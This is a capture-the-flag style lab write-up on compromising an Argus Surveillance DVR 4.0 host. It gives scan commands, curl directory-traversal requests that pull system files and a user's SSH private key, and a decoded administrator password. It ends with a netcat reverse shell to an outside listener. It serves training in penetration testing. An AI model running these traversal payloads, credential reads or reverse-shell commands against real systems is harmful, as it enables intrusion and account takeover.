# Dvr4

## Enumeration & scanning

- Scanning reveals an open SSH server and Argus Surveillance webapp (port 8080).
- Can browse to the surveillance panel, no login.
- Page `/about.html` shows it's version 4.0.
- Page `/MotionAndEvents.html` shows it's hosted in folder `C:\ProgramData\PY_Software\Argus Surveillance DVR\Images\`. 

``` sh
# Default scanning
sudo nmap -p- 192.168.193.179 
sudo nmap -p 22,135,139,445,5040,7680,8080 -A 192.168.193.179
```

## Exploitation

- Multiple exploits available for this version.
- Obvious one to start with is a directory traversal vulnerability.
- We can see some users in the webapp. These could be app users but also system users. They are `administrator` and `viewer`.
- Since we know SSH is being used on the system and this is not default for Windows, we could try to load the SSH key of the user `viewer`. This works.

``` sh
# Directory traversal POC
curl "http://192.168.193.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
# Retrieve SSH key of user `viewer`
# File would be 'C:/Users/viewer/.ssh/id_rsa
curl "http://192.168.193.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusers/viewer/.ssh/id_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
# Login via SSH
chmod 400 id_rsa
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o 'IdentitiesOnly=yes' -i id_rsa viewer@192.168.193.179
# Get flag
C:\Users\viewer\Desktop>type local.txt                                                                                   
4e40091c6f79593ed9f83b0aad994075 
```

## Privilege Escalation

- User `viewer` has barely any permissions on system. Can't get system information or services for instance. Home folder contains nc.exe.
- Therefore, maybe there is something to be found in the webapp folder.
- We find `.\DVRParams.ini` file, which is also mentioned in another exploit.
- We can crack the `administrator` password in here, assuming it's the same as the system password.
- Exploit POC can almost do it fully, but we need to find final character ourselves. We can do this by changing the password in the portal with special characters until it matches in the `.ini` file.

``` sh
# Get password from .\DVRParams.ini
# Credential reversed with exploit:
[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
# Trial and error gives us last character
D9A8 = $
# Complete credential is administrator:14WatchD0g$
# User home folder has nc.exe for reverse shell
# See notes for alternatives
nc -nlvp 4445
runas /user:administrator “.\nc.exe -e cmd.exe 192.168.45.237 4445”
# Get flag
```

## References

- https://www.exploit-db.com/exploits/45296
- https://www.exploit-db.com/exploits/50130
- https://github.com/G4sp4rCS/CVE-2022-25012-POC/blob/main/decode.py
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt 


## Rabbit holes

- Looked too long at interesting Windows files to load with directory traversal, not worth it. Not as obvious as with Linux.
- `nc.exe` in home folder is indicator that we can likely find administrator password somewhere.
